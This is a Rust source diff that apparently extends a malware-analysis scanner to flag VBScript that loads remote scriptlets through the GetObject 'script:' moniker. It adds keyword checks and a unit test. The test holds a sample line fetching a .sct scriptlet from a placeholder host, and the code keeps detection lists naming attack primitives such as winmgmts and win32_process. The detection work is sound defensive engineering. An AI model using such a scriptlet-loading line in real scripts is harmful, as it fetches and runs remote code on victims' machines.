@@ -3680,6 +3680,7 @@ fn looks_like_vbs_script(lower: &str) -> bool {
         || lower.contains("wscript")
         || lower.contains("xmlhttp")
         || lower.contains("winmgmts")
+        || (lower.contains("getobject") && lower.contains("script:"))
         || lower.contains("commandlineeventconsumer")
         || looks_like_office_vbs_startup_save(lower)
         || lower.contains("private function")
@@ -3732,6 +3733,7 @@ fn starts_like_standalone_vbs(lower: &str) -> bool {
         || looks_like_vbs_execute_assignment_prefix(first, lower)
         || (first.starts_with("set ") && first.contains("createobject"))
         || (first.starts_with("set ") && first.contains("getobject") && first.contains("winmgmts"))
+        || (first.starts_with("getobject") && first.contains("script:"))
         || (first.starts_with("with ") && first.contains("createobject"))
         || first.starts_with("createobject(")
         || first.starts_with("createobject (")
@@ -3780,6 +3782,7 @@ fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool
         b"xmlhttp",
         b"winmgmts",
         b"win32_process",
+        b"script:",
         b"option explicit",
         b"application.startuppath",
         b"executeexcel4macro",
@@ -21444,6 +21447,29 @@ End Sub"#;
             report.extracted_vbs.len(),
             1,
             "standalone Sub URLDownloadToFile input was not queued as VBS"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_getobject_script_moniker_is_scanned() {
+        let vbs = br#"GetObject("script:https://standalone-vbs-getobject.example/stage.sct")"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://standalone-vbs-getobject.example/stage.sct"
+                        && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from standalone VBS script moniker: {:?}",
+            report.traits
+        );
+        assert_eq!(
+            report.extracted_vbs.len(),
+            1,
+            "standalone VBS script moniker input was not queued as VBS"
         );
     }
 
